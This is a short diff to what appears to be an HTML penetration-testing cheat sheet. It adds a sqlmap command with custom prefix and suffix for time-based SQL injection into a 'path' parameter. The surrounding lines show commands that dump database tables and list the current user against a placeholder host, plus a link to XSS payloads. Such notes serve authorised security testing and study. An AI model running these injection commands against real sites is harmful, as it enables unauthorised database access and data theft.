@@ -1092,6 +1092,9 @@ sqlmap -r request.txt --dbms=mysql --dump [-T tablename -C column1,column2]
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap --url=https://vulner.able/host.php?path=* --technique=T --proxy=http://127.0.0.1:8080 --level=5 --risk=3 --dbms=MySQL --current-user 
 </code></pre></div></div>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap "https://vulner.able/host.php?path=1" -p path  --prefix=%27%7c%7c and --suffix=%7c%7c%27 --technique=T --dbs
+</code></pre></div></div>
+
 <h3 id="xss">XSS</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
